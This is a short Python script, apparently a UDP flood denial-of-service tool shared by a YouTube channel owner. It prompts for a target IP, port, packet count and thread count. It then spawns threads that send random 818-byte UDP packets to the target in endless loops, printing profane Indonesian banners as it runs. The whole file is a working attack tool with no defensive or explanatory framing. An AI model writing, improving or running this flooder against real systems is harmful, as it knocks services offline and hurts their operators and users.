import random
import socket
import threading
import os,sys

os.system("clear")
print("\033[95m")
print("FUCK NO ABUSE KONTOL")
print("SUBS YT GUA WizzlyXyZ")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GAS ATTACK(y/n):"))
times = int(input("PAKET NYA:"))
threads = int(input("ONGKOS NYA:"))

os.system("clear")
def run():
	data = random._urandom(818)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KENDOS KAN KONTOL !!!")
		except:
			print("[X] KENDOS MEMEK LEPAS!!!")

def run2():
	data = random._urandom(818)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KENDOS KAN KONTOL!!!")
		except:
			s.close()
			print("[X] KENDOS MEMEK LEPAS!!!")

def run3():
	data = random._urandom(818)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KENDOS KAN KONTOL !!!")
		except:
			s.close()
			print("[X] KENDOS MEMEK LEPAS!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()